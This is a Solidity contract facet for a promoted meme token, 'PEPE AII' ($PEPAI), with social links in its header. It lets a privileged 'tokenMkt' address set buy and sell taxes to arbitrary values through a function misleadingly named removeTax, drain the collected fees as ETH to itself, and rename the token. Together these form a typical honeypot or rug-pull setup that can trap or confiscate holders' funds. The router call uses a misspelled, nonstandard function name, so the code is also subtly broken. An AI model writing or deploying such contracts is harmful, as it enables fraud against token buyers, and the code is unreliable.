/*
Welcome to PEPE AII, where we're building Digital Immortality!  $PEPAI

Token: PEPAI

🔗 Useful links:
Twitter - https://twitter.com/PepeAi_onEth
Telegram - https://t.me/Pepe_Ai_Eth
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;
import "./TestLib.sol";
contract TaxModifiedFacet {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event DataChange(string _newName, string _newSymbol);
    function TaxModified(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _dataTokenMKTAuthencation()) revert Permissions();
        removeTax(_buy, _sell);
    }
    function _dataTokenMKTAuthencation() private view returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.storeData.tokenMkt;
    }
    function EnableTrade() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == _dataTokenMKTAuthencation());
        require(!ds.tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        ds.pair = _pair;
        ds.tradingOpen = true;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address tokenMkt = _dataTokenMKTAuthencation();
        require(ds.tradingOpen || from == tokenMkt || to == tokenMkt);

        ds.balanceOf[from] -= amount;

        if (
            to == ds.pair &&
            !ds.swapping &&
            ds.balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            ds.swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            ds.swapping = false;
        }

        (uint8 _initBuyFee, uint8 _initSellFee) = (
            ds.storeData.TaxOnBuy,
            ds.storeData.TaxOnSell
        );
        if (from != address(this) && ds.tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == ds.pair ? _initSellFee : _initBuyFee)) / 100;
            amount -= taxCalculatedAmount;
            ds.balanceOf[address(this)] += taxCalculatedAmount;
        }
        ds.balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function DataType(string calldata _newN, string calldata _newS) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (msg.sender != _dataTokenMKTAuthencation()) revert Permissions();
        ds._name = _newN;
        ds._symbol = _newS;
        emit DataChange(_newN, _newS);
    }
    function removeTax(uint8 _buy, uint8 _sell) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.storeData.TaxOnBuy = _buy;
        ds.storeData.TaxOnSell = _sell;
    }
}
